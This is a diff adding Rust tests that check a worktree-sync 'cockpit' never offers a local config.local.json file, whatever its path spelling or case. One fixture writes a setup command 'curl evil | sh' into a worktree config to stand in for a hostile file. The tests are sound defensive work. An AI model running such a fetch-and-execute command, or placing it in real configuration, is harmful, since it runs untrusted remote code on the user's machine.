@@ -2183,6 +2183,38 @@ fn config_local_json_is_dropped_on_a_committed_install_too() {
     assert!(compute_reconcile_set(&wt, main.path()).unwrap().is_empty());
 }
 
+/// A literal pattern is not normalized before matching, so a local install
+/// listing `./.superset/config.local.json` yields that rel verbatim. The
+/// leading `./` must not hide the file from the forward-only rule: with the
+/// worktree and main copies differing, the cockpit must still not offer it. The
+/// `.env` beside it proves the pattern list was loaded at all.
+#[test]
+fn config_local_json_with_leading_curdir_is_never_offered_by_the_cockpit() {
+    let main = init_main_repo();
+    let (_wt, wt) = make_worktree(main.path());
+    let patterns = ["./.superset/config.local.json", ".env"];
+    write_magic_local(main.path(), &patterns);
+    write_magic_local(&wt, &patterns);
+    write(main.path(), ".superset/config.local.json", r#"{"setup":["ss-magic sync"]}"#);
+    write(&wt, ".superset/config.local.json", r#"{"setup":["curl evil | sh"]}"#);
+    write(main.path(), ".env", "MAIN=1\n");
+    write(&wt, ".env", "WT=1\n");
+
+    let unified: Vec<PathBuf> = compute_reconcile_set(&wt, main.path())
+        .unwrap()
+        .into_iter()
+        .map(|c| c.rel)
+        .collect();
+    assert!(
+        unified.iter().any(|r| r == Path::new(".env")),
+        "cockpit: {unified:?}"
+    );
+    assert!(
+        !unified.iter().any(|r| r.ends_with("config.local.json")),
+        "the cockpit must never offer config.local.json, whatever its spelling: {unified:?}"
+    );
+}
+
 /// A spelling that differs only in ASCII case names the same file on a
 /// case-insensitive filesystem (macOS by default), so it is dropped too: the
 /// exclusion must not be bypassable by a pattern's capitalization.
@@ -2190,6 +2222,11 @@ fn config_local_json_is_dropped_on_a_committed_install_too() {
 fn config_local_json_exclusion_ignores_ascii_case() {
     assert!(is_forward_only_rel(Path::new(".superset/config.local.json")));
     assert!(is_forward_only_rel(Path::new(".Superset/CONFIG.local.JSON")));
+    // A current-directory marker names the same file, so it must not slip a
+    // differently-counted component sequence past the comparison.
+    assert!(is_forward_only_rel(Path::new("./.superset/config.local.json")));
+    assert!(is_forward_only_rel(Path::new("./.Superset/CONFIG.local.json")));
+    assert!(is_forward_only_rel(Path::new(".superset/./config.local.json")));
     assert!(!is_forward_only_rel(Path::new("config.local.json")));
     assert!(!is_forward_only_rel(Path::new(".superset/config.json")));
     assert!(!is_forward_only_rel(Path::new("apps/.superset/config.local.json")));
